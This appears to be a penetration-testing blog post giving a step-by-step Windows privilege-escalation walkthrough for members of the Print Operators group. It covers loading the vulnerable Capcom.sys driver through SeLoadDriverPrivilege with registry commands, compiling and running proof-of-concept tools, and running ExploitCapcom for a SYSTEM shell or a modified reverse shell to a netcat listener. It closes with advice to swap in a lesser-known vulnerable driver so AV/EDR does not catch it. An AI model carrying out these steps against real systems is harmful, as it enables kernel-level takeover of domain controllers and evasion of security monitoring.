---
title: Print Operators
date: 2026-06-26 23:15:24
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Groups
tags:
  - Privilege-Escalation
  - Windows
  - SYSTEM
  - SeLoadDriverPrivilege
  - Print-Operators
  - BYOVD
  - Bring-Your-Own-Vulnerable-Driver
  - Capcom
  - Capcom.sys
  - ExploitCapcom
  - EoPLoadDriver
  - DriverView
  - Kernel
  - Kernel-Driver
  - NTLoadDriver
  - UAC
  - Driver-Hijacking
---

> Print Operators is a Windows privileged group whose members can manage printers and printer drivers on Domain Controllers. This group grants the `SeLoadDriverPrivilege`, which allows loading kernel drivers. Because kernel drivers run with SYSTEM privileges, this role can be abused to load a vulnerable driver and execute code with full system privileges.

## Manual Exploitation

### Confirm privileges

> Run `whoami /priv` to check your current privilege set. What you see depends entirely on how you accessed the system.

#### Remote shell (evil-winrm / WinRM) ➜ no UAC bypass needed

> UAC only applies to interactive GUI sessions, WinRM authenticates at the network level, bypassing UAC entirely. `SeLoadDriverPrivilege` will already be visible as Disabled and we can go directly to enabling it.

```cmd
whoami /priv
```

> Expected output (WinRM):

```text
Privilege Name                Description                    State
============================= ============================== ========
SeLoadDriverPrivilege         Load and unload device drivers Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       ...                            Enabled
```

#### GUI / RDP access ➜ UAC bypass required

> From a non-elevated interactive session, `SeLoadDriverPrivilege` will not appear at all, UAC is hiding it. Open an elevated shell first via a UAC bypass from UACMe, or right-click and run as Administrator using the Print Operators account credentials.

```cmd
whoami /priv
```

> Expected output (non-elevated RDP : privilege is hidden):

```text
Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       ...                            Enabled
SeUndockPrivilege             ...                            Disabled
```

> `SeLoadDriverPrivilege` does not appear at all until we elevate. If we do not see it, we need to elevate first before continuing.

### Load the Vulnerable Driver

#### Add a reference to the vulnerable driver

> Download [Capcom.sys](<https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys>) and add a reference to it under the `HKEY_CURRENT_USER` registry hive:

```cmd
C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

> This creates the required registry entry that Windows uses to locate and load the driver.

#### Enable `SeLoadDriverPrivilege`

> Download the [EnableSeLoadDriverPrivilege PoC](<https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp>) and add the following includes at the top of the file:

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

> Compile it with `cl.exe`:

```powershell
C:\Users\mrb3n\Desktop\Print Operators> cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

> Run the compiled binary to enable the privilege and load the driver:

```cmd
C:\> EnableSeLoadDriverPrivilege.exe
```

#### Verify the driver is loaded

```powershell
PS C:\> .\DriverView.exe /stext drivers.txt
PS C:\> cat drivers.txt | Select-String -Pattern Capcom
```

> Expected output:

```text
Driver Name  : Capcom.sys
Filename     : C:\Tools\Capcom.sys
```

### Escalate privileges (with GUI access)

> Compile [ExploitCapcom](<https://github.com/tandasat/ExploitCapcom>) with Visual Studio, then run it:

```powershell
PS C:\> .\ExploitCapcom.exe
```

> A `cmd.exe` shell opens with SYSTEM privileges.

![NTLM Relay SMB to SMB](/img/cmd.png)

### Escalate privileges (without GUI access)

> Modify `ExploitCapcom.cpp` before compiling. Replace line 292:

```c
// original
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");

// replace with our reverse shell path
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

> Then run the compiled binary:

```powershell
PS C:\> .\ExploitCapcom.exe
```

> If successful, the reverse shell connects back to our listener with SYSTEM privileges.

> Start the listener before running ExploitCapcom:

```bash
nc -lvnp <port>
```

## Automatic Exploitation

### EoPLoadDriver

> We can use [EoPLoadDriver](<https://github.com/TarlogicSecurity/EoPLoadDriver/>) to automate the process of enabling the privilege, creating the registry key, and calling `NTLoadDriver` to load the driver — replacing the manual steps above.

```cmd
C:\> EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
```

> Once the driver is loaded, run ExploitCapcom as in the manual path.

>   * With GUI access:
>

```powershell
PS C:\> .\ExploitCapcom.exe
```

>   * Without GUI access (modify line 292 first as described above):
>

```powershell
PS C:\> .\ExploitCapcom.exe
```

> Detection note: `Capcom.sys` is a well-known vulnerable driver from 2016 and is in virtually every AV/EDR signature database ➜ it will be flagged immediately on a live target. In a real engagement, a less-known BYOVD (Bring Your Own Vulnerable Driver) target would be needed.
